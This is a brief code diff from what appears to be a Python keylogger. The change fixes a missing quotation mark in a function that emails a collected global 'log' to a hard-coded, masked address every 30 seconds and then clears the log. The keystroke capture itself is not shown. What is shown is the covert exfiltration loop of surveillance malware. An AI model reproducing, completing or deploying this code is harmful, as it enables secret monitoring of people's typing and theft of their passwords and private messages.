@@ -25,7 +25,7 @@ def send_email(email, password, message):
 
 def thread_function():
     global log
-    send_email(*******************", "*************", log) #Enter your mail address
+    send_email("*******************", "*************", log) #Enter your mail address
     log = " "
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
